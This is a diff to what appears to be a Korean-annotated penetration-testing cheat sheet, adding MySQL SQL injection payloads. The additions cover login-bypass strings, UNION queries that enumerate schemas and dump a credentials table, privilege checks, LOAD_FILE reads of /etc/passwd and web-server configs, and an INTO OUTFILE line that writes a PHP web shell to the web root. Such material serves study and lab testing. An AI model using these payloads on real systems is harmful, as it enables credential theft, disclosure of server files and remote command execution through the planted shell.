@@ -2,6 +2,7 @@
 ## 🔐 SQL Injection
 - mysql :  AND operator would be evaluated before the OR operator.
 ```sql
+# '으로 테스트 이후 정상 작동 페이로드 찾기
 admin'
 admin'-- -
 admin';-- -
@@ -12,6 +13,52 @@ admin')-- -
 username : admin' or '1'='1
 password : password' or '1'='1
 ```
+```sql
+' order by 1-- -
+' UNION select 1,2,3-- -
+
+# 실제로 printing 되는 column을 찾아야한다.
+' UNION select 1,@@version,3,4-- -
+
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+
+' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+```sql
+# FILE privilege
+' UNION SELECT 1, user(), 3, 4-- -
+
+' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -
+
+' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -
+
+' UNION SELECT 1, LOAD_FILE("/etc/nginx/sites-enabled/default"), 3, 4-- -
+
+' UNION SELECT 1, LOAD_FILE("%WinDir%\System32\Inetsrv\Config\ApplicationHost.config"), 3, 4-- -
+```
+```sql
+# secure_file_priv value is empty, meaning that we can read/write files to any location.
+# 500 error가 나오더라도 파일이 업로드 되었을 수 있음.
+' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
 
 ---
 
@@ -19,6 +66,14 @@ password : password' or '1'='1
 
 MySQL은 가장 널리 사용되는 오픈소스 관계형 데이터베이스 관리 시스템입니다.  
 **기본 포트**: 3306
+
+### default databases
+```mysql
+mysql
+information_schema
+performance_schema
+sys
+```
 
 ### 파일 읽기 (Read Files)
 
